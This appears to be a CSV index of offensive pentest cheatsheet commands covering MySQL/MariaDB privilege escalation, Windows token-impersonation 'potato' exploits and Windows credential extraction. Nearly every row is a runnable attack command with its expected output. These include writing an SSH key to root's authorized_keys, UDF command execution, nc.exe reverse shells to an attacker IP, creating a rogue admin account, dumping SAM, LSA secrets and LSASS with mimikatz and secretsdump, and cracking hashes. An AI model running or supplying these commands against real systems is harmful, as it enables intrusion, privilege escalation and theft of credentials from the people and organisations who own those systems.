"cheatsheet_id","command_id","context","scenario_title","section_title","example","shows"
"mariadb-mysql-enumeration","mysql-write-ssh-key","section","","Phase 4: File System Operations","SELECT 'ssh-rsa AAAA...' INTO OUTFILE '/root/.ssh/authorized_keys';","Adds SSH key for root access (if MySQL runs as root)"
"mariadb-mysql-enumeration","mysql-check-plugin-dir","section","","Phase 5: UDF Privilege Escalation","SHOW VARIABLES LIKE 'plugin_dir'; SELECT @@plugin_dir;","/usr/lib/mysql/plugin/ or C:\xampp\mysql\lib\plugin\"
"mariadb-mysql-enumeration","mysql-create-udf-function","section","","Phase 5: UDF Privilege Escalation","CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';","Query OK (after uploading UDF library to plugin_dir)"
"mariadb-mysql-enumeration","mysql-exec-udf-command","section","","Phase 5: UDF Privilege Escalation","SELECT sys_exec('id > /tmp/output.txt');","0 (success), check /tmp/output.txt for command output"
"mariadb-mysql-enumeration","mysql-drop-udf","section","","Phase 5: UDF Privilege Escalation","DROP FUNCTION sys_exec;","Cleanup after exploitation"
"mariadb-mysql-enumeration","mysql-check-bind-address","section","","Phase 6: Tunneling for Remote Access","SHOW VARIABLES LIKE 'bind_address';","127.0.0.1 (localhost only) or 0.0.0.0 (all interfaces)"
"mariadb-mysql-enumeration","tunnel-chisel-server","section","","Phase 6: Tunneling for Remote Access","chisel server -p 8080 --reverse","Run on Kali - listens for chisel client connections"
"mariadb-mysql-enumeration","tunnel-chisel-client","section","","Phase 6: Tunneling for Remote Access",".\chisel.exe client KALI_IP:8080 R:3306:127.0.0.1:3306","Run on target - forwards local MySQL to Kali"
"mariadb-mysql-enumeration","tunnel-ssh-local","section","","Phase 6: Tunneling for Remote Access","ssh -L 3306:127.0.0.1:3306 user@target","SSH local forward if you have SSH access"
"mariadb-mysql-enumeration","mysql-grant-remote","section","","Phase 6: Tunneling for Remote Access","GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY ''; FLUSH PRIVILEGES;","Allow root from any host (less stealthy)"
"mariadb-mysql-enumeration","mysql-extract-hash","section","","Phase 7: Hash Cracking","SELECT user, password FROM mysql.user WHERE password != '';","*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19"
"mariadb-mysql-enumeration","hashcat-mysql41","section","","Phase 7: Hash Cracking","hashcat -m 300 mysql_hashes.txt /usr/share/wordlists/rockyou.txt","Crack MySQL 4.1+ hashes (mode 300)"
"mariadb-mysql-enumeration","hashcat-mysql323","section","","Phase 7: Hash Cracking","hashcat -m 200 mysql_hashes.txt /usr/share/wordlists/rockyou.txt","Crack old MySQL 3.23 hashes (mode 200)"
"token-impersonation","printspoofer-interactive","scenario","Scenario 1: PrintSpoofer - Modern Windows (2016/2019/2022)","","",""
"token-impersonation","printspoofer-reverse-shell","scenario","Scenario 1: PrintSpoofer - Modern Windows (2016/2019/2022)","","",""
"token-impersonation","certutil-download","scenario","Scenario 1: PrintSpoofer - Modern Windows (2016/2019/2022)","","",""
"token-impersonation","godpotato-cmd","scenario","Scenario 2: GodPotato - Universal Modern Potato","","",""
"token-impersonation","godpotato-reverse-shell","scenario","Scenario 2: GodPotato - Universal Modern Potato","","",""
"token-impersonation","whoami-priv","scenario","Scenario 2: GodPotato - Universal Modern Potato","","",""
"token-impersonation","juicypotato-execute","scenario","Scenario 3: JuicyPotato - Legacy Windows (2008/2012/2016)","","",""
"token-impersonation","juicypotato-clsid-test","scenario","Scenario 3: JuicyPotato - Legacy Windows (2008/2012/2016)","","",""
"token-impersonation","netcat-upload","scenario","Scenario 3: JuicyPotato - Legacy Windows (2008/2012/2016)","","",""
"token-impersonation","roguepotato-execute","scenario","Scenario 4: RoguePotato - Network-Aware Variant","","",""
"token-impersonation","socat-relay-135","scenario","Scenario 4: RoguePotato - Network-Aware Variant","","",""
"token-impersonation","roguepotato-simple","scenario","Scenario 4: RoguePotato - Network-Aware Variant","","",""
"token-impersonation","sweetpotato-auto","scenario","Scenario 5: SweetPotato - All-in-One Potato","","",""
"token-impersonation","sweetpotato-efs","scenario","Scenario 5: SweetPotato - All-in-One Potato","","",""
"token-impersonation","sweetpotato-interactive","scenario","Scenario 5: SweetPotato - All-in-One Potato","","",""
"token-impersonation","whoami-priv","section","","Phase 1: Privilege Verification (1-2 minutes)","whoami /priv","SeImpersonatePrivilege Enabled"
"token-impersonation","whoami-all","section","","Phase 1: Privilege Verification (1-2 minutes)","whoami /all","Full user context including groups and privileges"
"token-impersonation","systeminfo-version","section","","Phase 1: Privilege Verification (1-2 minutes)","systeminfo | findstr /B /C:""OS Name"" /C:""OS Version""","Windows Server 2019 (determines which potato to use)"
"token-impersonation","wmic-os-version","section","","Phase 2: Windows Version to Potato Mapping","wmic os get caption,version","Microsoft Windows Server 2019 Standard 10.0.17763"
"token-impersonation","spooler-status","section","","Phase 2: Windows Version to Potato Mapping","sc query spooler","STATE: RUNNING (PrintSpoofer will work)"
"token-impersonation","hostname-domain","section","","Phase 2: Windows Version to Potato Mapping","hostname && echo %userdomain%","Machine name and domain context"
"token-impersonation","printspoofer-interactive","section","","Phase 3: PrintSpoofer (Windows 2019+)","PrintSpoofer64.exe -i -c cmd","Spawns interactive SYSTEM cmd.exe"
"token-impersonation","printspoofer-reverse-shell","section","","Phase 3: PrintSpoofer (Windows 2019+)","PrintSpoofer64.exe -c ""nc.exe 10.10.14.5 4445 -e cmd.exe""","SYSTEM reverse shell to attacker"
"token-impersonation","printspoofer-add-user","section","","Phase 3: PrintSpoofer (Windows 2019+)","PrintSpoofer64.exe -c ""net user pwned Password123! /add && net localgroup administrators pwned /add""","Creates admin user as SYSTEM"
"token-impersonation","godpotato-cmd","section","","Phase 4: GodPotato (Universal Modern)","GodPotato-NET4.exe -cmd ""cmd /c whoami""","nt authority\system"
"token-impersonation","godpotato-reverse-shell","section","","Phase 4: GodPotato (Universal Modern)","GodPotato-NET4.exe -cmd ""nc.exe 10.10.14.5 4445 -e cmd.exe""","SYSTEM reverse shell connection"
"token-impersonation","godpotato-powershell","section","","Phase 4: GodPotato (Universal Modern)","GodPotato-NET4.exe -cmd ""powershell -ep bypass -c IEX(...)""","PowerShell execution as SYSTEM"
"token-impersonation","juicypotato-execute","section","","Phase 5: JuicyPotato (Windows 2016 and Earlier)","JuicyPotato.exe -l 1337 -p rev.bat -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}","Testing CLSID... OK, SYSTEM shell spawned"
"token-impersonation","juicypotato-clsid-wmi","section","","Phase 5: JuicyPotato (Windows 2016 and Earlier)","JuicyPotato.exe -l 1337 -p rev.bat -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}","WMI CLSID for Server 2016"
"token-impersonation","juicypotato-create-bat","section","","Phase 5: JuicyPotato (Windows 2016 and Earlier)","echo nc.exe 10.10.14.5 4445 -e cmd.exe > C:\Windows\Temp\rev.bat","Creates batch file for JuicyPotato -p parameter"
"token-impersonation","roguepotato-execute","section","","Phase 6: RoguePotato and SweetPotato (Alternatives)","RoguePotato.exe -r 10.10.14.5 -l 9999 -e ""nc.exe 10.10.14.5 4445 -e cmd.exe""","SYSTEM shell via network OXID relay"
"token-impersonation","sweetpotato-auto","section","","Phase 6: RoguePotato and SweetPotato (Alternatives)","SweetPotato.exe -a ""nc.exe 10.10.14.5 4445 -e cmd.exe""","Auto-selects best technique, SYSTEM shell"
"token-impersonation","socat-relay-135","section","","Phase 6: RoguePotato and SweetPotato (Alternatives)","sudo socat tcp-listen:135,reuseaddr,fork tcp:TARGET_IP:9999","Attacker relay for RoguePotato"
"windows-credential-locations","reg-save-sam","scenario","Scenario 1: SAM Database Extraction - Local Account Hashes","","",""
"windows-credential-locations","reg-save-system","scenario","Scenario 1: SAM Database Extraction - Local Account Hashes","","",""
"windows-credential-locations","secretsdump-local-sam","scenario","Scenario 1: SAM Database Extraction - Local Account Hashes","","",""
"windows-credential-locations","mimikatz-lsadump-sam","scenario","Scenario 1: SAM Database Extraction - Local Account Hashes","","",""
"windows-credential-locations","reg-save-security","scenario","Scenario 2: LSA Secrets - Service Account Passwords","","",""
"windows-credential-locations","secretsdump-lsa-secrets","scenario","Scenario 2: LSA Secrets - Service Account Passwords","","",""
"windows-credential-locations","mimikatz-lsadump-secrets","scenario","Scenario 2: LSA Secrets - Service Account Passwords","","",""
"windows-credential-locations","secretsdump-remote","scenario","Scenario 2: LSA Secrets - Service Account Passwords","","",""
"windows-credential-locations","secretsdump-cached-creds","scenario","Scenario 3: Cached Domain Credentials - Offline Domain Attacks","","",""
"windows-credential-locations","mimikatz-lsadump-cache","scenario","Scenario 3: Cached Domain Credentials - Offline Domain Attacks","","",""
"windows-credential-locations","hashcat-dcc2","scenario","Scenario 3: Cached Domain Credentials - Offline Domain Attacks","","",""
"windows-credential-locations","john-mscash2","scenario","Scenario 3: Cached Domain Credentials - Offline Domain Attacks","","",""
"windows-credential-locations","mimikatz-sekurlsa-logonpasswords","scenario","Scenario 4: LSASS Memory Dump - Live Credential Extraction","","",""
"windows-credential-locations","procdump-lsass","scenario","Scenario 4: LSASS Memory Dump - Live Credential Extraction","","",""
"windows-credential-locations","comsvcs-minidump","scenario","Scenario 4: LSASS Memory Dump - Live Credential Extraction","","",""
"windows-credential-locations","pypykatz-minidump","scenario","Scenario 4: LSASS Memory Dump - Live Credential Extraction","","",""
"windows-credential-locations","mimikatz-sekurlsa-dpapi","scenario","Scenario 5: DPAPI Credential Extraction - Browser and App Passwords","","",""
"windows-credential-locations","cmdkey-list","scenario","Scenario 5: DPAPI Credential Extraction - Browser and App Passwords","","",""
"windows-credential-locations","mimikatz-vault-cred","scenario","Scenario 5: DPAPI Credential Extraction - Browser and App Passwords","","",""
"windows-credential-locations","sharpchromium-logins","scenario","Scenario 5: DPAPI Credential Extraction - Browser and App Passwords","","",""
"windows-credential-locations","secretsdump-just-dc","scenario","Scenario 6: secretsdump.py - All-in-One Remote Extraction","","",""
"windows-credential-locations","secretsdump-full","scenario","Scenario 6: secretsdump.py - All-in-One Remote Extraction","","",""
"windows-credential-locations","secretsdump-hashes","scenario","Scenario 6: secretsdump.py - All-in-One Remote Extraction","","",""
"windows-credential-locations","secretsdump-ntds-offline","scenario","Scenario 6: secretsdump.py - All-in-One Remote Extraction","","",""
"windows-credential-locations","whoami-priv-backup","section","","Phase 1: Credential Location Overview","whoami /priv | findstr -i ""backup debug""","SeBackupPrivilege or SeDebugPrivilege Enabled"
"windows-credential-locations","reg-query-sam","section","","Phase 1: Credential Location Overview","reg query HKLM\SAM","Access check for SAM hive"
"windows-credential-locations","tasklist-lsass","section","","Phase 1: Credential Location Overview","tasklist /fi ""imagename eq lsass.exe""","LSASS process PID for memory dump"
"windows-credential-locations","reg-save-sam","section","","Phase 2: SAM Database Extraction","reg save HKLM\SAM C:\Windows\Temp\sam.save","The operation completed successfully."
"windows-credential-locations","reg-save-system","section","","Phase 2: SAM Database Extraction","reg save HKLM\SYSTEM C:\Windows\Temp\system.save","The operation completed successfully."
"windows-credential-locations","secretsdump-local-sam","section","","Phase 2: SAM Database Extraction","impacket-secretsdump -sam sam.save -system system.save LOCAL","Administrator:500:aad3...:31d6cfe0..."
"windows-credential-locations","reg-save-security","section","","Phase 3: LSA Secrets Extraction","reg save HKLM\SECURITY C:\Windows\Temp\security.save","The operation completed successfully."
"windows-credential-locations","secretsdump-lsa-secrets","section","","Phase 3: LSA Secrets Extraction","impacket-secretsdump -security security.save -system system.save LOCAL","_SC_MSSQLSERVER:P@ssw0rd123!"
"windows-credential-locations","mimikatz-lsadump-secrets","section","","Phase 3: LSA Secrets Extraction","mimikatz.exe ""privilege::debug"" ""lsadump::secrets"" ""exit""","Service account plaintext passwords"
"windows-credential-locations","mimikatz-sekurlsa-logonpasswords","section","","Phase 4: LSASS Memory Extraction","mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit""","Domain user NTLM hashes and potential plaintext"
"windows-credential-locations","procdump-lsass","section","","Phase 4: LSASS Memory Extraction","procdump.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp","Dump file created for offline analysis"
"windows-credential-locations","pypykatz-minidump","section","","Phase 4: LSASS Memory Extraction","pypykatz lsa minidump lsass.dmp","Credentials extracted on Linux"
"windows-credential-locations","mimikatz-lsadump-cache","section","","Phase 5: Cached Domain Credentials","mimikatz.exe ""privilege::debug"" ""lsadump::cache"" ""exit""","Cached domain credentials (DCC2 format)"
"windows-credential-locations","hashcat-dcc2","section","","Phase 5: Cached Domain Credentials","hashcat -m 2100 dcc2.txt /usr/share/wordlists/rockyou.txt","Cracking DCC2 hashes (slow)"
